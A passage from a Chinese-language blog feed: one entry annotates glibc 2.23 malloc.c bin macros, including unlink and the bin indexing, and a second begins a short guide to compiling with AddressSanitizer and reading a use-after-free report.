needed</span></span><br><span class="line"><span class="comment">    for the small bins, which all contain the same-sized chunks, but</span></span><br><span class="line"><span class="comment">    facilitates best-fit allocation for larger chunks. These lists</span></span><br><span class="line"><span class="comment">    are just sequential. Keeping them in order almost never requires</span></span><br><span class="line"><span class="comment">    enough traversal to warrant using fancier ordered data</span></span><br><span class="line"><span class="comment">    structures.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of the same size are linked with the most</span></span><br><span class="line"><span class="comment">    recently freed at the front, and allocations are taken from the</span></span><br><span class="line"><span class="comment">    back.  This results in LRU (FIFO) allocation order, which tends</span></span><br><span class="line"><span class="comment">    to give each chunk an equal opportunity to be consolidated with</span></span><br><span class="line"><span class="comment">    adjacent freed chunks, resulting in larger free chunks and less</span></span><br><span class="line"><span class="comment">    fragmentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To simplify use in double-linked lists, each bin header acts</span></span><br><span class="line"><span class="comment">    as a malloc_chunk. This avoids special-casing for headers.</span></span><br><span class="line"><span class="comment">    But to conserve space and improve locality, we allocate</span></span><br><span class="line"><span class="comment">    only the fd/bk pointers of bins, and then use repositioning tricks</span></span><br><span class="line"><span class="comment">    to treat these as the fields of a malloc_chunk*.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br></pre></td></tr></table></figure><p>跟 <code>mchunkptr</code> 差不多，不过是用在 bin（空闲堆块）里的</p><h3 id="bin-at-m-i-宏"><a href="#bin-at-m-i-宏" class="headerlink" title="bin_at(m, i) 宏"></a>bin_at(m, i) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))                \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure><p>该宏用于获得某种类型的 bins 的某一个 bin 的地址，且该 bins 的基地址下标是 1 ，而不能是 0</p><h3 id="next-bin-b-宏（缺具体）"><a href="#next-bin-b-宏（缺具体）" class="headerlink" title="next_bin(b) 宏（缺具体）"></a>next_bin(b) 宏（缺具体）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure><p>获取下一个 bin 的地址</p><h3 id="first-b-宏"><a href="#first-b-宏" class="headerlink" title="first(b) 宏"></a>first(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 fd 指针</p><h3 id="last-b-宏"><a href="#last-b-宏" class="headerlink" title="last(b) 宏"></a>last(b) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>获取 bin 中的 bk 指针</p><h3 id="unlink-AV-P-BK-FD-宏（重点）（缺）"><a href="#unlink-AV-P-BK-FD-宏（重点）（缺）" class="headerlink" title="unlink(AV, P, BK, FD) 宏（重点）（缺）"></a>unlink(AV, P, BK, FD) 宏（重点）（缺）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                               \</span><br><span class="line">    BK = P-&gt;bk;                               \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))           \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                            \</span><br><span class="line">        FD-&gt;bk = BK;                           \</span><br><span class="line">        BK-&gt;fd = FD;                           \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                  \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">       <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)       \</span><br><span class="line">      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">         malloc_printerr (check_action,                  \</span><br><span class="line">                <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                P, AV);                   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                  \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;           \</span><br><span class="line">                <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;              \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;              \</span><br><span class="line">                  &#125;                            \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                         \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span><br><span class="line">              &#125;                               \</span><br><span class="line">          &#125;                               \</span><br><span class="line">      &#125;                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3 - 4 行：<code>FD = P-&gt;fd</code> 和 <code>BK = P-&gt;bk</code> 是分别获取传入参数 P 的前驱节点和后继节点5</p><p>5 行：if 语句用于判断 P 的前驱节点的后继节点是否为 P，P的后继节点的前驱节点是否为 P，且要通过条件最后返回值为 0</p><p>6 行：如果第五行的返回值为 1，那么就调用 <code>malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV)</code></p><p>7 - 9 行：如果返回值是 0，进入 else 语句，并且让 <strong>P 的前驱节点的后继节点变成 P 的后继节点</strong></p><p>​                再让 <strong>P 的后继节点的前驱节点变成 P 的前驱节点</strong>，完成删除双向链表上的 P 节点的操作</p><p>10 - 11 行：</p><h2 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h2><h3 id="NBINS-宏"><a href="#NBINS-宏" class="headerlink" title="NBINS 宏"></a>NBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br></pre></td></tr></table></figure><p>规定计算正常 bin 大小时的基准值</p><h3 id="NSMALLBINS-宏"><a href="#NSMALLBINS-宏" class="headerlink" title="NSMALLBINS 宏"></a>NSMALLBINS 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br></pre></td></tr></table></figure><p>规定计算正常 smallbin 大小时的基准值</p><h3 id="SMALLBIN-WIDTH-宏"><a href="#SMALLBIN-WIDTH-宏" class="headerlink" title="SMALLBIN_WIDTH 宏"></a>SMALLBIN_WIDTH 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br></pre></td></tr></table></figure><p>正常情况在 32 位下，这个值是 0x08；在 64 下这个值是 0x10</p><h3 id="SMALLBIN-CORRECTION-宏"><a href="#SMALLBIN-CORRECTION-宏" class="headerlink" title="SMALLBIN_CORRECTION 宏"></a>SMALLBIN_CORRECTION 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>这种就是在非正常情况下会有返回值 1，即在满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 时</p><h3 id="MIN-LARGE-SIZE-宏"><a href="#MIN-LARGE-SIZE-宏" class="headerlink" title="MIN_LARGE_SIZE 宏"></a>MIN_LARGE_SIZE 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure><p>用于规定 smallbin 的最大值(不等于)和 largebin 的最大值</p><p>正常情况下 64 位的最小值为 <code>(64 - 0) * 0x10 == 0x400</code>；32 位的最小值为 <code>(64 - 0) * 0x08 == 0x200</code></p><h3 id="in-smallbin-range-sz-宏"><a href="#in-smallbin-range-sz-宏" class="headerlink" title="in_smallbin_range(sz) 宏"></a>in_smallbin_range(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure><p>如果一个 chunk 的 size 小于 MIN_LARGE_SIZE，那么该 chunk 就属于 smallbin</p><h3 id="smallbin-index-sz-宏"><a href="#smallbin-index-sz-宏" class="headerlink" title="smallbin_index(sz) 宏"></a>smallbin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure><p>SMALLBIN_CORRECTION 是用来兼容 <code>long double</code> 的</p><p>这个宏的主要意思就是在 64 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 4</code> 来规划</p><p>在 32 位下，smallbin 中堆块的下标按照 <code>(unsigned) (sz)) &gt;&gt; 3</code> 来规划</p><p>且可以看出 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 的兼容操作只可能会在 32 位系统上出现</p><h3 id="largebin-index-32-sz-宏"><a href="#largebin-index-32-sz-宏" class="headerlink" title="largebin_index_32(sz) 宏"></a>largebin_index_32(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>) ?  <span class="number">56</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧，这个是一般情况下 32 位的 largebin 分布</p><h3 id="largebin-index-32-big-sz-宏"><a href="#largebin-index-32-big-sz-宏" class="headerlink" title="largebin_index_32_big(sz) 宏"></a>largebin_index_32_big(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>) ?  <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>参考 largebin_index_64(sz) 吧</p><p>这个是满足 <code>2 *SIZE_SZ &lt; __alignof__ (long double)</code> 下 32 位的 largebin 分布</p><h3 id="largebin-index-64-sz-宏"><a href="#largebin-index-64-sz-宏" class="headerlink" title="largebin_index_64(sz) 宏"></a>largebin_index_64(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure><p>可以看到大小为 <code>0x400</code> 的 chunk 对应的 index 为 <code>(0x400 &gt;&gt; 6) + 48</code> 即 64</p><p>而 index 为 64 对应的范围是 <code>[0x400, 0x400 + 1 &gt;&gt; 6)</code> 即 <code>[0x400, 0x440)</code></p><p>在这个级别的 index 中，size 的范围为 0x40（1&lt;&lt;6），依次类推 size 与 index 对应的关系是：</p><table><thead><tr><th align="center"></th><th align="center">size</th><th align="center">index</th></tr></thead><tbody><tr><td align="center">等差 0x40</td><td align="center">[0x400 , 0x440)</td><td align="center">64</td></tr><tr><td align="center"></td><td align="center">[0x440 , 0x480)</td><td align="center">65</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0xC00 , 0xC40)</td><td align="center">96</td></tr><tr><td align="center"></td><td align="center">[0xC40 , 0xE00)</td><td align="center">97</td></tr><tr><td align="center">等差 0x200</td><td align="center">[0xE00 , 0x1000)</td><td align="center">98</td></tr><tr><td align="center"></td><td align="center">[0x1000 , 0x1200)</td><td align="center">99</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x2800 , 0x2A00)</td><td align="center">111</td></tr><tr><td align="center"></td><td align="center">[0x2A00 , 0x3000)</td><td align="center">112</td></tr><tr><td align="center">等差 0x1000</td><td align="center">[0x3000 , 0x4000)</td><td align="center">113</td></tr><tr><td align="center"></td><td align="center">[0x4000 , 0x5000)</td><td align="center">114</td></tr><tr><td align="center"></td><td align="center">……</td><td align="center">……</td></tr><tr><td align="center"></td><td align="center">[0x9000 , 0xA000)</td><td align="center">119</td></tr><tr><td align="center"></td><td align="center">[0xA000 , 0x10000)</td><td align="center">120</td></tr><tr><td align="center">等差 0x8000</td><td align="center">[0x10000 , 0x18000)</td><td align="center">121</td></tr><tr><td align="center"></td><td align="center">[0x18000 , 0x20000)</td><td align="center">122</td></tr><tr><td align="center"></td><td align="center">[0x20000 , 0x28000)</td><td align="center">123</td></tr><tr><td align="center">等差 0x18000</td><td align="center">[0x28000 , 0x40000)</td><td align="center">124</td></tr><tr><td align="center">等差 0x40000</td><td align="center">[0x40000 , 0x80000)</td><td align="center">125</td></tr><tr><td align="center"></td><td align="center">[0x80000 , …. )</td><td align="center">126</td></tr></tbody></table><h3 id="largebin-index-sz-宏"><a href="#largebin-index-sz-宏" class="headerlink" title="largebin_index(sz) 宏"></a>largebin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure><p>用来指定 largebin 应该以哪一种方式来指定当前堆块大小所对应的下标</p><h3 id="bin-index-sz-宏"><a href="#bin-index-sz-宏" class="headerlink" title="bin_index(sz) 宏"></a>bin_index(sz) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_index(sz) \</span></span><br><span class="line">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span><br></pre></td></tr></table></figure><p>判断当前堆块的大小是满足 smallbin 还是满足 largebin，然后去对应的宏里得到该堆块大小所对应的下标</p><h2 id="Unsorted-chunks"><a href="#Unsorted-chunks" class="headerlink" title="Unsorted chunks"></a>Unsorted chunks</h2><h3 id="unsorted-chunks-M"><a href="#unsorted-chunks-M" class="headerlink" title="unsorted_chunks(M)"></a>unsorted_chunks(M)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure><h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><h3 id="initial-top-M-宏"><a href="#initial-top-M-宏" class="headerlink" title="initial_top(M) 宏"></a>initial_top(M) 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure><h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><h3 id="BINMAPSHIFT-宏"><a href="#BINMAPSHIFT-宏" class="headerlink" title="BINMAPSHIFT 宏"></a>BINMAPSHIFT 宏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap&#x27; is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【ASAN】简单使用指南</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;以下内容仅为归纳，具体细节可自行测试。&lt;/p&gt;
&lt;h2 id=&quot;使用步骤&quot;&gt;&lt;a href=&quot;#使用步骤&quot; class=&quot;headerlink&quot; title=&quot;使用步骤&quot;&gt;&lt;/a&gt;使用步骤&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;用&lt;code&gt;-fsanitize=address&lt;/co
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>以下内容仅为归纳，具体细节可自行测试。</p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ul><li>用<code>-fsanitize=address</code>选项编译和链接你的程序。</li><li>用<code>-fno-omit-frame-pointer</code>编译，以得到更容易理解stack trace。</li><li>可选择<code>-O1</code>或者更高的优化级别编译</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc -fsanitize=address -fno-omit-frame-pointer -O1 -g use-after-<span class="built_in">free</span>.c -o use-after-<span class="built_in">free</span></span><br></pre></td></tr></table></figure><p>如果发现错误，就会打印如下日志信息，如<code>UAF</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">=================================================================</span><br><span class="line">==<span class="number">4897</span>==ERROR: AddressSanitizer: heap-use-after-free <span class="keyword">on</span> address <span class="number">0x60200000eff0</span> at pc <span class="number">0x0000004009b6</span> bp <span class="number">0x7fff58399250</span> sp <span class="number">0x7fff58399240</span></span><br><span class="line">READ of size <span class="number">4</span> at <span class="number">0x60200000eff0</span> thread T0</span><br><span class="line">    <span class="meta">#0 0x4009b5 in main /home/c7/桌面/asan/use_after_free.c:14</span></span><br><span class="line">    <span class="meta">#1 0x7fd6cf95b83f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2083f)</span></span><br><span class="line">    <span class="meta">#2 0x400868 in _start (/home/c7/桌面/asan/use_after_free+0x400868)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60200000eff0</span> <span class="keyword">is</span> located <span class="number">0</span> bytes inside of <span class="number">4</span>-<span class="built_in">byte</span> region [<span class="number">0x60200000eff0</span>,<span class="number">0x60200000eff4</span>)</span><br><span class="line">freed <span class="keyword">by</span> thread T0 here:</span><br><span class="line">    <span class="meta">#0 0x7fd6cfd9d2ca in __interceptor_free (/usr/lib/gcc/x86_64-linux-gnu/5/libasan.so+0x982ca)</span></span><br><span class="line">    <span class="meta">#1 0x40097e in main /home/c7/桌面/asan/use_after_free.c:13</span></span><br><span class="line">    <span 